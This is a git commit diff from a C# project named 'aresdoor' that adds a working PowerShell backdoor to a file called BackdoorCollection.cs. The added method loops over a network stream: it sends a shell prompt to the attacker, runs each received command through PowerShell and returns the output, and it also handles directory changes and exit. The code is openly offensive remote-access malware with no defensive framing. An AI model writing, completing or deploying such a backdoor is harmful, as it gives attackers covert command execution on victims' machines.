2939b45ca617e1ac1e5e8ce7d82b7797aa9f2c2b
Willy Fox <official.blackvikingpro@gmail.com>
2018-01-13 09:26:57 -0600

    added support for Powershell

--- aresdoor/BackdoorCollection.cs
+++ aresdoor/BackdoorCollection.cs
@@ -38,7 +38,27 @@ namespace aresdoor
 
         public bool PowershellBackdoor(NetworkStream stream)
         {
-            return true;
+            while (true)
+            {
+                // Send shellcode to attacker:
+                nc.dataTravelTO(stream, "PS " + System.IO.Directory.GetCurrentDirectory() + "> ");
+                // Recieve response from client application
+                string responseFromServer = nc.dataTravelFROM(stream);
+
+                if (responseFromServer.Contains("cd"))
+                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
+                else if (responseFromServer.Contains("exit"))
+                    return false;
+                else
+                    try { nc.dataTravelTO(stream, Misc.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
+                #if DEBUG
+                    catch (Exception exc) { Console.WriteLine(exc); return false; }
+                #else
+                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
+                #endif
+            }
+
+            return false; // Should we ever get here, it's probably because of an error.
         }
     }
 }
